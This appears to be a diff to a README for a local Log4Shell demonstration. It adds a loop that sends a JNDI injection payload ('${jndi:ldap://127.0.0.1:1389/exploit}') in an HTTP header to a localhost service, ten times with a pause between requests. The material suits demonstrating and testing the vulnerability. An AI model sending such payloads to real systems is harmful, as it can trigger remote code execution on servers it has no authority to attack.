@@ -45,6 +45,12 @@ mvn exec:java -Dexec.mainClass=demo.CallbackMonitor
 curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:8080/
 ```
 
+or 
+
+```
+for i in {1..10}; do curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:8080/; sleep 2; done
+```
+
 ###Troubleshooting if no callback output 
 
 ```
